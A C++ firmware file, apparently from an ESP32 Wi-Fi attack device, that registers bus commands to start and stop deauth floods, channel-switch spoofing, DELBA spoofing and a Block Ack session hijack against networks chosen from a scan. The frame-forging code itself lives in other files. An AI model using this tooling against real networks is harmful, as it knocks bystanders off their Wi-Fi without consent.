// wbus objects for the commands that have moved onto the bus.
//
// Migration rule for this file: a command may only move here when its reply text
// is reproduced byte for byte, because firmware/tests/ and lab/*.py parse those
// lines. Everything else keeps running through the legacy strcmp chain in
// serial_console.cpp until it gets the same treatment -- one command at a time,
// never a big-bang.
#include <WiFi.h>
#include <string.h>

#include "console_commands.h"
#include "csa.h"
#include "deauth.h"
#include "delba.h"
#include "wbus.h"

namespace {

// ---- deauth -----------------------------------------------------------------

const wb_arg_spec_t kDeauthStartArgs[] = {
    // Not "required": DEAUTH with no index used to reach do_deauth(-1) and print
    // the index error there. Keeping the default at -1 preserves that text.
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "index out of range, run SCAN first",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "reason",
     .type = WB_T_REASON,
     .flags = 0,
     .enums = nullptr,
     .label = "deauth reason: 1..65535, or random",
     .err = "reason must be 1..65535, or 'random'",
     .def = 1,
     .min = 0,
     .max = 0},
};

wb_err_t deauth_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  uint16_t reason = 1;
  // The reason is applied before the index is checked, matching the legacy order
  // (a bad reason is reported even when the index is bad as well).
  if (!console_apply_reason(wb_arg(args, "reason"), &reason)) return WB_ERR_ARG;
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  if (!attack_deauth_single(index, reason)) {
    wb_reply_line(reply, "ERR cannot start deauth on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK DEAUTH %d %s\n", index, WiFi.SSID(index).c_str());
  console_ui_log("deauth started");
  wbus_emit("deauth.state", "active=1");
  return WB_OK;
}

// One radio, one job: this is the same teardown the STOP command performs, so the
// reply is the STOP line verbatim.
wb_err_t deauth_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  attack_stop();
  wb_reply_printf(reply, "OK STOP deauth_frames=%u probe_frames=%u\n",
                  (unsigned)attack_deauth_frames(), (unsigned)attack_probe_frames());
  console_ui_log("stopped");
  wbus_emit("deauth.state", "active=0");
  return WB_OK;
}

const wb_method_t kDeauthMethods[] = {
    {.name = "start",
     .args = kDeauthStartArgs,
     .n_args = 2,
     .handler = deauth_bus_start,
     .summary = "deauth / disassoc one AP"},
    {.name = "stop",
     .args = nullptr,
     .n_args = 0,
     .handler = deauth_bus_stop,
     .summary = "STOP"},
};

// ---- CSA --------------------------------------------------------------------

const wb_arg_spec_t kCsaStartArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: CSA <idx> [new-channel|auto] [count 2-8] [hold-seconds]",
     .def = -1,
     .min = 0,
     .max = 0},
    // "auto" or a channel number. No range check on purpose: the legacy code
    // treats any negative number as auto, and stricter validation would reject
    // commands that used to be accepted.
    {.name = "ch",
     .type = WB_T_ENUM,
     .flags = WB_F_NUMERIC_OK,
     .enums = "auto",
     .label = "new channel, or auto (opposite band)",
     .err = "new channel must be 1..14 or 36..196",
     .def = -1,
     .min = 0,
     .max = 0},
    // cnt/secs keep the handler's own checks (the exact text lives below); the
    // policy only guarantees one tokenizer and typed access.
    {.name = "cnt",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "beacon count 2..8",
     .err = "count must be 2..8 (a real AP counts down)",
     .def = 5,
     .min = 0,
     .max = 0},
    {.name = "secs",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "hold seconds 1..600 (fixed channel only)",
     .err = "hold seconds must be 1..600",
     .def = 15,
     .min = 0,
     .max = 0},
};

// The body of the old do_csa(), unchanged except for the reply sink.
wb_err_t csa_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0) {
    wb_reply_line(reply, "ERR usage: CSA <idx> [new-channel|auto] [count 2-8] [hold-seconds]");
    return WB_ERR_ARG;
  }

  const wb_value_t* ch = wb_arg(args, "ch");
  const bool auto_channel =
      (ch == nullptr) || !ch->present || (ch->text != nullptr && strcmp(ch->text, "auto") == 0);

  // Auto mode is time-based (CSA_AUTO_HOLD_MS per round) and ignores count/hold,
  // exactly as before; a fixed channel keeps the seconds-based one-shot window.
  const long channel = auto_channel ? -1 : ch->num;
  const long count = auto_channel ? 5 : wb_arg_num(args, "cnt");
  const long hold_seconds = auto_channel ? 5 : wb_arg_num(args, "secs");

  if (index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  const bool running_auto = (channel < 0);
  if (!running_auto) {
    const bool is_2g = channel >= 1 && channel <= 14;
    const bool is_5g = channel >= 36 && channel <= 196;
    if (!is_2g && !is_5g) {
      wb_reply_line(reply, "ERR new channel must be 1..14 or 36..196");
      return WB_ERR_ARG;
    }
    if ((long)WiFi.channel(index) == channel) {
      wb_reply_line(reply, "ERR new channel must differ from the AP channel");
      return WB_ERR_ARG;
    }
  }
  if (count < 2 || count > 8) {
    wb_reply_line(reply, "ERR count must be 2..8 (a real AP counts down)");
    return WB_ERR_ARG;
  }
  if (!running_auto && (hold_seconds < 1 || hold_seconds > 600)) {
    wb_reply_line(reply, "ERR hold seconds must be 1..600");
    return WB_ERR_ARG;
  }

  const uint16_t hold_ms =
      running_auto ? (uint16_t)CSA_AUTO_HOLD_MS : (uint16_t)(hold_seconds * 1000);
  if (!csa_start(index, running_auto ? 0 : (uint8_t)channel, (uint8_t)count, hold_ms,
                 running_auto)) {
    wb_reply_line(reply, "ERR cannot start CSA on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK CSA %d %s count=%ld hold=%ums loop=%d ssid=%s\n", index,
                  running_auto ? "auto(opposite-band)" : "fixed", count, (unsigned)hold_ms,
                  running_auto ? 1 : 0, WiFi.SSID(index).c_str());
  console_ui_log("csa started");
  wbus_emit("csa.state", "active=1");
  return WB_OK;
}

wb_err_t csa_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = csa_frames();
  csa_stop();
  wb_reply_printf(reply, "OK CSASTOP frames=%u\n", (unsigned)frames);
  console_ui_log("csa stopped");
  wbus_emit("csa.state", "active=0");
  return WB_OK;
}

wb_err_t csa_bus_test(const wb_args_t*, wb_reply_t*) {
  // The selftest dumps its own hex through csa.cpp; it stays a debug-only path.
  csa_selftest();
  return WB_OK;
}

const wb_method_t kCsaMethods[] = {
    {.name = "start",
     .args = kCsaStartArgs,
     .n_args = 4,
     .handler = csa_bus_start,
     .summary = "CSA spoof (channel switch announce)"},
    {.name = "stop",
     .args = nullptr,
     .n_args = 0,
     .handler = csa_bus_stop,
     .summary = "stop the CSA spoof"},
    {.name = "test",
     .args = nullptr,
     .n_args = 0,
     .handler = csa_bus_test,
     .summary = "dump the CSA action/beacon bytes"},
};

// ---- DELBA ------------------------------------------------------------------

const wb_arg_spec_t kDelbaStartArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: DELBA <idx> [reason]",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "reason",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "reason code: 1, 32, 37, 38, 39 (default 37)",
     .err = "reason must be one of 1, 32, 37, 38, 39",
     .def = 37,
     .min = 0,
     .max = 0},
};

wb_err_t delba_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0) {
    wb_reply_line(reply, "ERR usage: DELBA <idx> [reason]");
    return WB_ERR_ARG;
  }
  // Cast like the legacy path did: 70000 wraps to 4464 and is then rejected by
  // delba_reason_is_defined(), not by the parser.
  const uint16_t reason = (uint16_t)wb_arg_num(args, "reason");
  if (index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  if (!delba_reason_is_defined(reason)) {
    wb_reply_line(reply, "ERR reason must be one of 1, 32, 37, 38, 39");
    return WB_ERR_ARG;
  }
  attack_stop();
  if (!delba_start(index, reason)) {
    wb_reply_line(reply, "ERR cannot start DELBA on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK DELBA %d reason=%u ch=%u ssid=%s\n", index, (unsigned)reason,
                  (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
  console_ui_log("delba started");
  wbus_emit("delba.state", "active=1");
  return WB_OK;
}

wb_err_t delba_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = delba_frames();
  delba_stop();
  wb_reply_printf(reply, "OK DELBASTOP frames=%u\n", (unsigned)frames);
  console_ui_log("delba stopped");
  wbus_emit("delba.state", "active=0");
  return WB_OK;
}

wb_err_t delba_bus_test(const wb_args_t*, wb_reply_t*) {
  delba_selftest();
  return WB_OK;
}

const wb_method_t kDelbaMethods[] = {
    {.name = "start",
     .args = kDelbaStartArgs,
     .n_args = 2,
     .handler = delba_bus_start,
     .summary = "DELBA spoof: tear down Block Ack sessions"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = delba_bus_stop, .summary = "stop the DELBA spoof"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = delba_bus_test, .summary = "dump the DELBA action frame bytes"},
};

// ---- BA session hijack ------------------------------------------------------

// `step` is deliberately not range-checked by the policy: the legacy commands
// checked the index first and the step second, and the error text differs between
// BAATTACK and the plant/push pair. WB_F_JUNK_ZERO keeps `BARPUSH 0 abc` meaning
// step 0, exactly as strtol() used to.

const wb_arg_spec_t kBaAttackArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: BAATTACK <idx> [step 128-2047]",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "step",
     .type = WB_T_INT,
     .flags = WB_F_JUNK_ZERO,
     .enums = nullptr,
     .label = "window offset 0..2047 (0..127 = control run)",
     .err = nullptr,
     .def = 512,
     .min = 0,
     .max = 0},
};

const wb_arg_spec_t kBaPlantArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: BAPLANT <idx> [step 0-2047]",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "step",
     .type = WB_T_INT,
     .flags = WB_F_JUNK_ZERO,
     .enums = nullptr,
     .label = "window offset 0..2047 (0..127 = control run)",
     .err = nullptr,
     .def = 512,
     .min = 0,
     .max = 0},
};

const wb_arg_spec_t kBaPushArgs[] = {
    {.name = "idx",
     .type = WB_T_INT,
     .flags = 0,
     .enums = nullptr,
     .label = "scan index (run SCAN first)",
     .err = "usage: BARPUSH <idx> [step 0-2047]",
     .def = -1,
     .min = 0,
     .max = 0},
    {.name = "step",
     .type = WB_T_INT,
     .flags = WB_F_JUNK_ZERO,
     .enums = nullptr,
     .label = "window offset 0..2047 (0..127 = control run)",
     .err = nullptr,
     .def = 512,
     .min = 0,
     .max = 0},
};

// Shared pre-checks in the legacy order: index, then step, then "one radio, one job".
bool ba_prepare(const wb_args_t* args, wb_reply_t* reply, const char* usage, const char* step_err,
                int* index, long* step) {
  *index = (int)wb_arg_num(args, "idx");
  *step = wb_arg_num(args, "step");
  if (*index < 0) {
    char line[96];
    snprintf(line, sizeof(line), "ERR %s", usage);
    wb_reply_line(reply, line);
    return false;
  }
  if (*index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return false;
  }
  if (*step < 0 || *step > 2047) {
    wb_reply_line(reply, step_err);
    return false;
  }
  attack_stop();
  return true;
}

wb_err_t ba_bus_attack(const wb_args_t* args, wb_reply_t* reply) {
  int index = 0;
  long step = 0;
  if (!ba_prepare(args, reply, "usage: BAATTACK <idx> [step 128-2047]",
                  "ERR step must be 0..2047 (0..127 = control run, the window is not moved)",
                  &index, &step)) {
    return WB_ERR_ARG;
  }
  if (!delba_start_ba(index, (uint16_t)step)) {
    wb_reply_line(reply, "ERR cannot start the BA attack on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK BAATTACK %d step=%ld ch=%u ssid=%s\n", index, step,
                  (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
  console_ui_log("ba attack started");
  wbus_emit("ba.state", "active=1");
  return WB_OK;
}

wb_err_t ba_bus_plant(const wb_args_t* args, wb_reply_t* reply) {
  int index = 0;
  long step = 0;
  if (!ba_prepare(args, reply, "usage: BAPLANT <idx> [step 0-2047]",
                  "ERR step must be 0..2047 (0..127 = control run)", &index, &step)) {
    return WB_ERR_ARG;
  }
  if (!delba_ba_plant_once(index, (uint16_t)step)) {
    wb_reply_line(reply, "ERR cannot start the BA plant on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK BAPLANT %d step=%ld ch=%u\n", index, step,
                  (unsigned)WiFi.channel(index));
  console_ui_log("ba plant started");
  return WB_OK;
}

wb_err_t ba_bus_push(const wb_args_t* args, wb_reply_t* reply) {
  int index = 0;
  long step = 0;
  if (!ba_prepare(args, reply, "usage: BARPUSH <idx> [step 0-2047]",
                  "ERR step must be 0..2047 (0..127 = control run)", &index, &step)) {
    return WB_ERR_ARG;
  }
  if (!delba_ba_bar_once(index, (uint16_t)step)) {
    wb_reply_line(reply, "ERR cannot start the BAR push on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK BARPUSH %d step=%ld ch=%u\n", index, step,
                  (unsigned)WiFi.channel(index));
  console_ui_log("bar push started");
  return WB_OK;
}

wb_err_t ba_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t delba_n = delba_ba_delba_frames();
  const uint32_t addba_n = delba_ba_addba_frames();
  const uint32_t bar_n = delba_ba_bar_frames();
  delba_stop();
  wb_reply_printf(reply, "OK BASTOP delba=%u addba=%u bar=%u\n", (unsigned)delba_n,
                  (unsigned)addba_n, (unsigned)bar_n);
  console_ui_log("ba attack stopped");
  wbus_emit("ba.state", "active=0");
  return WB_OK;
}

wb_err_t ba_bus_test(const wb_args_t*, wb_reply_t*) {
  delba_ba_selftest();
  return WB_OK;
}

wb_err_t ba_bus_tx(const wb_args_t*, wb_reply_t*) {
  static const uint8_t probe_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
  delba_ba_tx_probe(probe_mac);
  return WB_OK;
}

const wb_method_t kBaMethods[] = {
    {.name = "attack",
     .args = kBaAttackArgs,
     .n_args = 2,
     .handler = ba_bus_attack,
     .summary = "BA-session hijack: DELBA -> forged ADDBA -> BAR"},
    {.name = "plant",
     .args = kBaPlantArgs,
     .n_args = 2,
     .handler = ba_bus_plant,
     .summary = "plant the reorder window once, then stay silent"},
    {.name = "push",
     .args = kBaPushArgs,
     .n_args = 2,
     .handler = ba_bus_push,
     .summary = "send only BARs, then stay silent"},
    {.name = "tx", .args = nullptr, .n_args = 0, .handler = ba_bus_tx, .summary = "one DELBA/ADDBA/BAR + driver verdict"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = ba_bus_stop, .summary = "stop the BA hijack"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = ba_bus_test, .summary = "dump the forged ADDBA / BAR bytes"},
};

const wb_object_t kObjects[] = {
    {.name = "deauth",
     .title = "Deauth / disassoc flood",
     .methods = kDeauthMethods,
     .n_methods = (int)(sizeof(kDeauthMethods) / sizeof(kDeauthMethods[0])),
     .events = "state"},
    {.name = "csa",
     .title = "CSA spoof",
     .methods = kCsaMethods,
     .n_methods = (int)(sizeof(kCsaMethods) / sizeof(kCsaMethods[0])),
     .events = "state"},
    {.name = "delba",
     .title = "DELBA spoof",
     .methods = kDelbaMethods,
     .n_methods = (int)(sizeof(kDelbaMethods) / sizeof(kDelbaMethods[0])),
     .events = "state"},
    {.name = "ba",
     .title = "BA session hijack",
     .methods = kBaMethods,
     .n_methods = (int)(sizeof(kBaMethods) / sizeof(kBaMethods[0])),
     .events = "state"},
};

}  // namespace

void wbus_register_all(void) {
  for (const wb_object_t& obj : kObjects) {
    wbus_register(&obj);
  }
}
